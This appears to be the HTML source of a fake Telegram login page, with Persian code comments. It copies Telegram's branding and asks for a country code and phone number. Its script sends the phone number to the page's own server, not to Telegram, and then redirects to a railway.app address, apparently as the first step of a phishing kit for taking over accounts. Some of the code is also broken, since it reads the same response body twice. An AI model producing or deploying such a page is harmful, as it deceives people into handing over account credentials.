<!DOCTYPE html>
<html lang="en">
<head>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@250;400&display=swap" rel="stylesheet">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-weight: 50%lighter;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 80vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            width: 420px; /* افزایش عرض */
            background-color: rgb(255, 255, 255);
        }
        .logo {
            width: 125px; /* 25% افزایش عرض لوگو */
            margin-bottom: 8px;
            margin-top: -25px;
        }
        h1 {
            font-size: 20px; /* 25% افزایش سایز عنوان */
            font-family: 'Roboto';
            margin-bottom: 10px;
            font-weight: 400;
        }
        h2 {
            font-size: 13px; /* 25% افزایش سایز توضیحات */
            font-weight: 400;
            color: #707579;
            width: 85%; /* 25% افزایش عرض توضیحات */
            margin: 0 auto 12.5px auto;
            margin-bottom: 35px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input, select {
            margin-bottom: 15px; /* 25% افزایش فاصله بین المان‌ها */
            padding: 12.5px; /* 25% افزایش فضای داخلی */
            font-size: 17.5px; /* 25% افزایش سایز فونت */
            border: 1px solid #ccc;
            border-radius: 12px; /* 25% افزایش گردی گوشه‌ها */
        }
        select {
            max-height: 2; /* افزایش ارتفاع لیست کشورها */
            overflow-y: 100px;
            background-color: #ffffff;
        }
        input:focus, select:focus {
            border-color: #3390ec;
            outline: none;
        }
        button {
            padding: 12.5px; /* 25% افزایش ارتفاع دکمه */
            font-size: 17.5px; /* 25% افزایش سایز متن دکمه */
            color: white;
            background-color: #3390ec;
            border: none;
            border-radius: 12.5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #3390ec;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-top: 10px;
            margin-bottom: 25px; /* 25% افزایش فاصله پایین */
        }
        .checkbox-container input {
            margin-right: 6px; /* افزایش فاصله بین چک‌باکس و متن */
            background-color: #3390ec;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        <h1>Telegram</h1>
        <h2>Please confirm your country code and enter your phone number.</h2>
        <form method="POST" id="loginForm">
            <select name="country" required>
                <option value="Iran">Iran (+98)</option>
                <option value="Afghanistan">Afghanistan (+93)</option>
                <option value="Albania">Albania (+355)</option>
                <option value="Algeria">Algeria (+213)</option>
                <option value="Andorra">Andorra (+376)</option>
                <option value="Angola">Angola (+244)</option>
                <option value="Antigua and Barbuda">Antigua and Barbuda (+1-268)</option>
                <option value="Argentina">Argentina (+54)</option>
                <option value="Armenia">Armenia (+374)</option>
                <option value="Australia">Australia (+61)</option>
                <option value="Austria">Austria (+43)</option>
                <option value="Azerbaijan">Azerbaijan (+994)</option>
                <option value="Bahamas">Bahamas (+1-242)</option>
                <option value="Bahrain">Bahrain (+973)</option>
                <option value="Bangladesh">Bangladesh (+880)</option>
                <option value="Barbados">Barbados (+1-246)</option>
                <option value="Belarus">Belarus (+375)</option>
                <option value="Belgium">Belgium (+32)</option>
                <option value="Belize">Belize (+501)</option>
                <option value="Benin">Benin (+229)</option>
                <option value="Bhutan">Bhutan (+975)</option>
                <option value="Bolivia">Bolivia (+591)</option>
                <option value="Bosnia and Herzegovina">Bosnia and Herzegovina (+387)</option>
                <option value="Botswana">Botswana (+267)</option>
                <option value="Brazil">Brazil (+55)</option>
                <option value="Brunei">Brunei (+673)</option>
                <option value="Bulgaria">Bulgaria (+359)</option>
                <option value="Burkina Faso">Burkina Faso (+226)</option>
                <option value="Burundi">Burundi (+257)</option>
                <option value="Cabo Verde">Cabo Verde (+238)</option>
                <option value="Cambodia">Cambodia (+855)</option>
                <option value="Cameroon">Cameroon (+237)</option>
                <option value="Canada">Canada (+1)</option>
                <option value="Central African Republic">Central African Republic (+236)</option>
                <option value="Chad">Chad (+235)</option>
                <option value="Chile">Chile (+56)</option>
                <option value="China">China (+86)</option>
                <option value="Colombia">Colombia (+57)</option>
                <option value="Comoros">Comoros (+269)</option>
                <option value="Congo (Congo-Brazzaville)">Congo (Congo-Brazzaville) (+242)</option>
                <option value="Costa Rica">Costa Rica (+506)</option>
                <option value="Croatia">Croatia (+385)</option>
                <option value="Cuba">Cuba (+53)</option>
                <option value="Cyprus">Cyprus (+357)</option>
                <option value="Czech Republic">Czech Republic (+420)</option>
                <option value="Denmark">Denmark (+45)</option>
                <option value="Djibouti">Djibouti (+253)</option>
                <option value="Dominica">Dominica (+1-767)</option>
                <option value="Dominican Republic">Dominican Republic (+1-809, 1-829, 1-849)</option>
                <option value="Ecuador">Ecuador (+593)</option>
                <option value="Egypt">Egypt (+20)</option>
                <option value="El Salvador">El Salvador (+503)</option>
                <option value="Equatorial Guinea">Equatorial Guinea (+240)</option>
                <option value="Eritrea">Eritrea (+291)</option>
                <option value="Estonia">Estonia (+372)</option>
                <option value="Eswatini">Eswatini (+268)</option>
                <option value="Ethiopia">Ethiopia (+251)</option>
                <option value="Fiji">Fiji (+679)</option>
                <option value="Finland">Finland (+358)</option>
                <option value="France">France (+33)</option>
                <option value="Gabon">Gabon (+241)</option>
                <option value="Gambia">Gambia (+220)</option>
                <option value="Georgia">Georgia (+995)</option>
                <option value="Germany">Germany (+49)</option>
                <option value="Ghana">Ghana (+233)</option>
                <option value="Greece">Greece (+30)</option>
                <option value="Grenada">Grenada (+1-473)</option>
                <option value="Guatemala">Guatemala (+502)</option>
                <option value="Guinea">Guinea (+224)</option>
                <option value="Guinea-Bissau">Guinea-Bissau (+245)</option>
                <option value="Guyana">Guyana (+592)</option>
                <option value="Haiti">Haiti (+509)</option>
                <option value="Honduras">Honduras (+504)</option>
                <option value="Hungary">Hungary (+36)</option>
                <option value="Iceland">Iceland (+354)</option>
                <option value="India">India (+91)</option>
                <option value="Indonesia">Indonesia (+62)</option>
                <option value="Iraq">Iraq (+964)</option>
                <option value="Ireland">Ireland (+353)</option>
                <option value="Israel">Israel (+972)</option>
                <option value="Italy">Italy (+39)</option>
                <option value="Jamaica">Jamaica (+1-876)</option>
                <option value="Japan">Japan (+81)</option>
                <option value="Jordan">Jordan (+962)</option>
                <option value="Kazakhstan">Kazakhstan (+7)</option>
                <option value="Kenya">Kenya (+254)</option>
                <option value="Kiribati">Kiribati (+686)</option>
                <option value="Kuwait">Kuwait (+965)</option>
                <option value="Kyrgyzstan">Kyrgyzstan (+996)</option>
                <option value="Laos">Laos (+856)</option>
                <option value="Latvia">Latvia (+371)</option>
                <option value="Lebanon">Lebanon (+961)</option>
                <option value="Lesotho">Lesotho (+266)</option>
                <option value="Liberia">Liberia (+231)</option>
                <option value="Libya">Libya (+218)</option>
                <option value="Liechtenstein">Liechtenstein (+423)</option>
                <option value="Lithuania">Lithuania (+370)</option>
                <option value="Luxembourg">Luxembourg (+352)</option>
                <option value="Madagascar">Madagascar (+261)</option>
                <option value="Malawi">Malawi (+265)</option>
                <option value="Malaysia">Malaysia (+60)</option>
                <option value="Maldives">Maldives (+960)</option>
                <option value="Mali">Mali (+223)</option>
                <option value="Malta">Malta (+356)</option>
                <option value="Marshall Islands">Marshall Islands (+692)</option>
                <option value="Mauritania">Mauritania (+222)</option>
                <option value="Mauritius">Mauritius (+230)</option>
            </select>
            <input type="text" name="phone" placeholder="Phone Number" required pattern="\d{8,15}" title="Enter a valid phone number">
            <div class="checkbox-container">
                <label>
                    <input type="checkbox" name="keep_signed_in" checked> Keep me signed in
                </label>
            </div>
            <button type="submit">Next</button>
        </form>
    </div>

    <script>
        const form = document.querySelector('#loginForm');
        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            const formData = new FormData(form);
            try {
                const response = await fetch('/', {
                    method: 'POST',
                    body: formData
                });
                console.log("Server response status:", response.status); // دیباگ بیشتر
                console.log("Server response:", await response.text()); // دیباگ بیشتر
                const data = await response.json();
                console.log("Parsed data:", data); // دیباگ بیشتر
                if (data.status === "success") {
                    window.location.href = data.redirect_url || "https://codever-production.up.railway.app/";
                    console.log("Redirecting to:", data.redirect_url || "https://codever-production.up.railway.app/");
                } else {
                    alert(data.message || "An error occurred");
                    console.log("Error response:", data);
                }
            } catch (error) {
                console.error("Fetch error:", error);
                alert(`Server error, please try again later: ${error.message || error}`);
                console.log("Full error object:", error);
            }
        });
    </script>
</body>
</html>
